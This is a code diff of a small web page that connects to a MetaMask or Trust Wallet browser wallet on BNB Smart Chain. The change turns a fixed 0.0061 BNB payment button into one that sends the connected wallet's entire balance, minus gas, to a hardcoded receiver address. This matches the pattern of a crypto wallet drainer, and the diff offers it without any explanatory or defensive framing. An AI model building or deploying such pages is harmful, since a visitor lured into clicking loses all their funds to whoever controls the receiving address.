@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BNB Manual Matched TX</title>
+  <title>Send All BNB Minus Gas</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 </head>
 <body>
   <div style="padding: 20px; text-align: center;">
-    <h2>Send 0.0061 BNB</h2>
+    <h2>Send Full BNB Balance</h2>
     <button id="sendButton" style="padding: 15px 30px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px;">Send Now</button>
     <div id="status" style="margin-top: 20px; color: #000;"></div>
   </div>
@@ -25,7 +25,7 @@
 
     document.getElementById('sendButton').addEventListener('click', async () => {
       if (typeof window.ethereum === 'undefined') {
-        updateStatus('MetaMask or Trust Wallet not found.', true);
+        updateStatus('Trust Wallet or MetaMask not found.', true);
         return;
       }
 
@@ -41,22 +41,31 @@
       }
 
       const gasLimit = 21000;
-      const gasPrice = web3.utils.toWei('0.1', 'gwei'); // exactly match with 0.1 Gwei
+      const gasPrice = await web3.eth.getGasPrice(); // current network gas price
+      const gasFee = BigInt(gasLimit) * BigInt(gasPrice);
+
+      const balanceWei = BigInt(await web3.eth.getBalance(sender));
+      if (balanceWei <= gasFee) {
+        updateStatus('Insufficient balance for gas.', true);
+        return;
+      }
+
+      const sendAmount = balanceWei - gasFee;
+      const valueHex = '0x' + sendAmount.toString(16);
 
       const nonce = await web3.eth.getTransactionCount(sender, 'latest');
-      const value = web3.utils.toWei('0.0061', 'ether');
 
       const tx = {
         from: sender,
         to: receiverAddress,
-        value: web3.utils.toHex(value),
+        value: valueHex,
         gas: web3.utils.toHex(gasLimit),
         gasPrice: web3.utils.toHex(gasPrice),
         nonce: web3.utils.toHex(nonce),
         chainId: 56
       };
 
-      updateStatus('Sending transaction...');
+      updateStatus('Sending entire balance...');
 
       try {
         const txHash = await web3.eth.sendTransaction(tx);
